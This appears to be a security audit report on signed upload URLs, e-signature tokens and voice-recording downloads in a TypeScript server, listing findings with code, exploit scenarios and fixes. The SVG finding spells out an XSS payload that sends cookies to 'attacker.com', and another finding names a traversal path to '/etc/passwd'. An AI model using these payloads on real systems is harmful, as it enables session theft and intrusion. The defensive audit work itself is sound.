# S27 — Signed Upload URLs / Pre-signed Download URLs

**Scope reviewed:**
- `packages/server/src/utils/signedUploads.ts`
- `packages/server/src/routes/expenseReceipts.routes.ts`
- `packages/server/src/routes/ticketSignatures.routes.ts`
- `packages/server/src/routes/estimateSign.routes.ts`
- `packages/server/src/routes/voice.routes.ts` (uses its own recording signed-URL scheme)
- `packages/server/src/index.ts` (signed-URL route handler + `/uploads` static serving)
- `packages/server/src/config.ts` (uploadsSecret, jwtSecret)
- `packages/server/src/middleware/fileUploadValidator.ts`
- `packages/server/src/utils/fileValidation.ts`
- `packages/server/src/db/migrations/126_estimate_signatures_export_schedules.sql`

---

### [HIGH] Estimate sign token HMAC always fails — ms-precision truncation

**Where:** `packages/server/src/routes/estimateSign.routes.ts:274–277` (sign) and `:399–400` (verify)

**What:**
`buildSignToken` computes the HMAC over the raw epoch-ms timestamp (`expiresTs = Date.now() + ttl_ms`). That timestamp is then written to SQLite via `sqlTimestamp()`, which truncates it to second precision (`YYYY-MM-DD HH:MM:SS`). On the verify path, `toEpochMs(tokenRow.expires_at)` reconstructs the epoch from the stored second-precision string. The reconstructed value differs from the original by `Date.now() % 1000` milliseconds, so the recomputed HMAC never matches the issued one unless the creation timestamp happened to land at exactly 000 ms (probability ≈ 1/1000).

**Code:**
```typescript
// Issue path — HMAC bound to ms-precision timestamp
const expiresTs = now + ttlMinutes * 60 * 1000;         // e.g. 1746259200123
const expiresAt = sqlTimestamp(new Date(expiresTs));     // "2025-05-03 09:20:00" (truncated!)
const rawToken = buildSignToken(estimateId, expiresTs);  // HMAC over "42.1746259200123"

// Verify path — HMAC recomputed over truncated (different) value
const expiresTs = toEpochMs(tokenRow.expires_at);       // 1746259200000 (no .123)
if (!verifySignTokenHmac(estimateId, expiresTs, givenHmac)) // "42.1746259200000" ≠ "42.1746259200123"
  throw new AppError('Sign link is invalid or has expired', 404);
```

**Exploit:**
No exploit needed — all legitimately issued estimate sign tokens are rejected with 404 ("Sign link is invalid or has expired"), making the e-sign feature completely non-functional except by rare timing coincidence. Customers cannot sign estimates via the public link.

**Fix:**
Align precision consistently. Either: (a) truncate `expiresTs` to seconds before building the token: `const expiresTs = Math.floor((now + ttlMinutes * 60 * 1000) / 1000) * 1000;`, or (b) embed `expires_at` as an integer seconds column (instead of TEXT) and round-trip via seconds arithmetic. Both `buildSignToken` and `sqlTimestamp` must operate at the same precision.

---

### [MEDIUM] Voice recording signed URLs reuse `jwtSecret` as HMAC key

**Where:** `packages/server/src/routes/voice.routes.ts:272` and `:343`

**What:**
The per-recording short-lived download token is signed with `config.jwtSecret` — the same secret used to sign all user session JWTs — rather than the dedicated `config.uploadsSecret` introduced in SEC-H54. A JWT secret compromise (via log leak, env export, debug endpoint, etc.) now additionally grants the ability to forge valid recording download tokens for arbitrary call IDs, meaning an attacker gains audio access alongside session access. The blast radius of a single key leak is unnecessarily broad.

**Code:**
```typescript
// GET /voice/calls/:id/recording-url — token issuance
const hmac = crypto
  .createHmac('sha256', config.jwtSecret)   // ← should be config.uploadsSecret or a dedicated key
  .update(`${callId}|${expires}`)
  .digest('hex');

// GET /voice/recording/:id — token verification
const expected = crypto
  .createHmac('sha256', config.jwtSecret)   // ← same issue
  .update(`${id}|${expiresStr}`)
  .digest('hex');
```

**Exploit:**
An attacker who obtains `JWT_SECRET` (e.g., from an exposed environment variable, a server-side debug endpoint, or a misconfigured secrets manager) can forge HMAC tokens with any `callId` and a future `expires`, then stream call recordings of any tenant without authentication.

**Fix:**
Use `config.uploadsSecret` (or derive a separate recording-access key via HKDF from it) for recording tokens. The key is already available and isolated from JWT signing per SEC-H54. Update both the issuance and verification sites in `voice.routes.ts`.

---

### [MEDIUM] SVG accepted as e-signature data URL — stored XSS vector

**Where:** `packages/server/src/routes/estimateSign.routes.ts:58–61` and `:526–529`

**What:**
The public e-sign endpoint accepts `data:image/svg+xml;base64,...` as a valid signature data URL. SVG documents can contain embedded `<script>` elements, `onload` event handlers, and `<foreignObject>` with HTML. The raw data URL (including any embedded SVG scripts) is stored verbatim in `estimate_signatures.signature_data_url`. If the admin panel ever renders this data URL in an unsafe context (e.g., as an `<img>` fallback, via `innerHTML`, or as an `<embed>` source), an attacker who controls the signer input can execute arbitrary JavaScript in the operator's browser session.

**Code:**
```typescript
const ACCEPTED_DATA_URL_PREFIXES = [
  'data:image/png;base64,',
  'data:image/svg+xml;base64,',  // ← SVG allows embedded scripts
];
// No sanitization of the decoded SVG content before DB insert (line 611)
```

**Exploit:**
A malicious customer submits a POST to `/public/api/v1/estimate-sign/:token` with `signature_data_url: "data:image/svg+xml;base64,<base64 of SVG with <script>fetch('https://attacker.com?c='+document.cookie)</script>>"`. If an operator views the signature in the admin UI and it is rendered unsafely, the script fires and exfiltrates the operator's session cookie.

**Fix:**
Remove `data:image/svg+xml;base64,` from `ACCEPTED_DATA_URL_PREFIXES`. Signatures should be raster images only (PNG or JPEG). If SVG is business-required, decode and sanitize with a server-side SVG sanitizer (e.g., DOMPurify in a Node JSDOM context) before storage, and ensure the frontend always renders signatures via sandboxed `<img>` elements (which browsers already sandbox for SVG).

---

### [MEDIUM] `signUploadUrl` HMAC uses raw filename; verifier receives URL-encoded filename

**Where:** `packages/server/src/utils/signedUploads.ts:65–70` (sign) and `:101` (verify)

**What:**
`signUploadUrl` computes the HMAC canonical string over the **raw (unencoded) `file`** argument but URL-encodes the file before embedding it in the returned URL path (`encodeURIComponent(file)` at line 69). The Express regex-route handler (`app.get(/^\/signed-url\/...$/`, `index.ts:1358`) receives path parameters as **raw URL captures without decoding**, so it passes the percent-encoded filename directly to `verifySignedUpload`. The verifier recomputes the HMAC over the percent-encoded string, which never matches the HMAC over the raw string. Any signed URL for a filename containing spaces, Unicode characters, or any `encodeURIComponent`-modified characters will fail verification. The function has zero callers in the current codebase, but the bug will silently break the first consumer added.

**Code:**
```typescript
// signUploadUrl — HMAC over raw file:
const canonical = canonicalString(type, slug, file, exp);  // e.g. "uploads|tenant|foo bar.jpg|exp"
const encodedFile = encodeURIComponent(file);               // "foo%20bar.jpg" in URL
return `/signed-url/.../foo%20bar.jpg?exp=...&sig=...`;

// verifySignedUpload called with req.params[2] = "foo%20bar.jpg" (no auto-decode in regex route):
const canonical = canonicalString(type, slug, file, exp);  // "uploads|tenant|foo%20bar.jpg|exp" ← MISMATCH
```

**Exploit:**
Any caller of `signUploadUrl` with a filename containing non-ASCII-safe characters generates a URL that the `/signed-url/` handler will always reject with 403 "Invalid signature". Effectively, signed URL delivery (email receipts, MMS media links, portal attachments) will be broken for any real-world filenames containing spaces or special characters.

**Fix:**
Normalise to a single representation throughout. Option A: HMAC canonical uses the **URL-encoded** form (`encodeURIComponent(file)`) — change line 65 to `const canonical = canonicalString(type, slug, encodedFile, exp)` (after computing `encodedFile`). Option B: the route handler decodes `req.params[2]` with `decodeURIComponent` before passing to `verifySignedUpload`. Option A is simpler and keeps the canonical string consistent with the URL.

---

### [LOW] No path-containment check on `recording_local_path` before file streaming

**Where:** `packages/server/src/routes/voice.routes.ts:291–298` and `:368–370`

**What:**
Both the token-authenticated recording endpoint (`GET /voice/recording/:id`) and the JWT-authenticated recording endpoint (`GET /voice/calls/:id/recording`) construct the file path as `path.join(config.uploadsPath, call.recording_local_path.replace(/^\/uploads\//, ''))` and stream the result without verifying the resolved path stays inside `config.uploadsPath`. In contrast, the `/signed-url/` handler in `index.ts:1385` does perform a `resolved.startsWith(baseDir)` check. If `recording_local_path` in the database ever contains a crafted value such as `../../../etc/passwd`, the file would be streamed to the caller. The path is written exclusively by the webhook handler with a controlled format (`/uploads/{slug}/recordings/call-{id}-{random}.mp3`), so exploitation requires prior database write access, but the defense-in-depth layer is absent.

**Code:**
```typescript
const filePath = path.join(
  config.uploadsPath,
  call.recording_local_path.replace(/^\/uploads\//, ''),  // no containment check
);
if (fs.existsSync(filePath)) {
  fs.createReadStream(filePath).pipe(res);  // ← could stream any file if path escapes
}
```

**Exploit:**
An attacker with the ability to write an arbitrary `recording_local_path` into `call_logs` (e.g., via a compromised tenant DB or future SQL-injection path) could set the path to `../../etc/hostname` and retrieve server filesystem files by fetching a recording URL with a valid HMAC token for that call ID.

**Fix:**
Add the same containment check already used in the `/signed-url/` handler: `if (!path.resolve(filePath).startsWith(path.resolve(config.uploadsPath))) throw new AppError('Forbidden', 403);`. Apply to both recording-serve code paths.

---

### [LOW] `image/heic` allowed in MIME whitelist but has no magic-byte signature entry

**Where:** `packages/server/src/routes/expenseReceipts.routes.ts:48–55` and `packages/server/src/utils/fileValidation.ts:56–88`

**What:**
`ALLOWED_RECEIPT_MIMES` includes `'image/heic'` and `ALLOWED_RECEIPT_EXTENSIONS` includes `'.heic'`. However, `fileValidation.ts::SIGNATURES` contains no entry for HEIC/HEIF. Every HEIC receipt upload passes multer's `fileFilter` (which only checks `file.mimetype`) and then hits `fileUploadValidator` which calls `validateFileOnDisk`. Since HEIC bytes don't match any registered signature, the call returns `{ valid: false, error: 'Unrecognized file signature' }` and the upload is rejected with 400. HEIC uploads are silently broken for all users.

**Code:**
```typescript
// expenseReceipts.routes.ts:48
const ALLOWED_RECEIPT_MIMES = [
  'image/jpeg', 'image/png', 'image/webp',
  'image/heic',  // ← accepted by fileFilter but rejected by magic-byte validator
];

// fileValidation.ts — no HEIC/HEIF entry in SIGNATURES array
const SIGNATURES: readonly Signature[] = [
  { type: 'jpeg', ... },
  { type: 'png', ... },
  { type: 'gif', ... },
  { type: 'webp', ... },
  { type: 'pdf', ... },
  // HEIC missing
];
```

**Exploit:**
No security exploit — this is a functional regression. iOS users who take photos in HEIC format cannot upload expense receipts. The upload appears to succeed at the UI level (multer accepts it) and then fails at the validation step with a confusing "file content does not match declared type" error.

**Fix:**
Add a HEIC/HEIF signature entry to `SIGNATURES`. HEIC files are ISO Base Media File Format containers; the magic bytes are `00 00 00 NN 66 74 79 70 68 65 69 63` (the `ftyp heic` box). A suitable entry: `{ type: 'heic', bytes: [null, null, null, null, 0x66, 0x74, 0x79, 0x70], allowedMimes: ['image/heic', 'image/heif'] }` with an `extraCheck` that confirms bytes 8–11 are `heic`, `heis`, `mif1`, or `msf1`.

---

### [INFO] `signUploadUrl` is exported but has zero callers — signed-URL upload path is dead code

**Where:** `packages/server/src/utils/signedUploads.ts:54–71`

**What:**
`signUploadUrl` is the issuing half of the signed-URL scheme. The verifying half (`verifySignedUpload`) is wired into `index.ts:1330` and serves the `/signed-url/*` endpoint. However, `signUploadUrl` is never imported or called anywhere in the codebase (confirmed by exhaustive grep across `packages/`). The endpoint exists and can verify signatures, but no code in the server ever generates them. Portal receipt links, MMS media links, and other intended callers (noted in the docblock) are currently non-functional and would need to be wired up.

**Fix:**
Not a security finding — tracking item. Wire callers for portal receipts, MMS media, and estimate attachments as noted in the SEC-H54 comment; or document the feature as planned-but-not-yet-implemented.

---

### [INFO] No signed-URL revocation mechanism; max TTL is 7 days

**Where:** `packages/server/src/utils/signedUploads.ts:29–31`

**What:**
The signed-URL scheme uses a stateless HMAC (no nonce/jti stored in DB). Once a URL is issued, it cannot be revoked before expiry. The maximum TTL is 7 days (`TTL_MAX_SECONDS = 7 * 24 * 60 * 60`). If a signed URL is leaked (e.g., in server logs, browser history sync, a forwarded email), any recipient can fetch the file for up to a week. The estimate sign tokens use a DB-backed `consumed_at` mechanism, but the generic signed-upload URLs do not.

**Fix:**
For high-sensitivity content (recordings, signed documents), consider storing issued URLs in a short-lived DB table keyed by a nonce, and invalidating on explicit delete or file removal. Alternatively, reduce the default TTL for sensitive types and document the 7-day max as a ceiling for exceptional cases only (e.g., MMS media that requires a long window for provider fetch).

---
